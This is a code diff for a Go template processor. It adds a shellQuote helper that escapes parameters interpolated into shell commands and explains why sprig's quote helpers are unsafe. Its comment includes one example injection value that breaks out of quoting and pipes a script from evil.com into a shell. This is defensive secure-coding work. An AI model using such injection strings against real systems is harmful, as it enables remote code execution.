@@ -8,6 +8,25 @@ import (
 	"github.com/Masterminds/sprig/v3"
 )
 
+// shellQuote wraps s in single quotes for safe interpolation into a POSIX
+// shell command, escaping any single quotes already in s so the value
+// cannot break out of the quoting.
+//
+// sprig's own "quote"/"squote" helpers just wrap the value in quotes
+// without escaping an embedded quote character, so they are not safe for
+// this purpose: a location value like `x'; curl evil.com/x.sh | sh #`
+// would still break out of a bare `'{{ .location }}'` (or a
+// sprig-squoted one) and inject a second command. shellQuote is
+// registered under its own name precisely so it isn't confused with
+// those.
+//
+// Tool authors: prefer piping any parameter you interpolate into a shell
+// command through this function, e.g. `{{ .location | shellQuote }}`,
+// rather than wrapping it in literal quotes yourself.
+func shellQuote(s string) string {
+	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
+}
+
 // ProcessTemplate processes a template with the given arguments.
 // It uses Go's template engine to substitute variables in the template.
 //
@@ -20,9 +39,11 @@ import (
 //   - An error if template processing fails
 func ProcessTemplate(text string, args map[string]interface{}) (string, error) {
 	// Create a template from the command string
+	funcs := sprig.FuncMap()
+	funcs["shellQuote"] = shellQuote
 	tmpl, err := template.New("command").
 		Option("missingkey=zero").
-		Funcs(sprig.FuncMap()).
+		Funcs(funcs).
 		Parse(text)
 	if err != nil {
 		return "", err
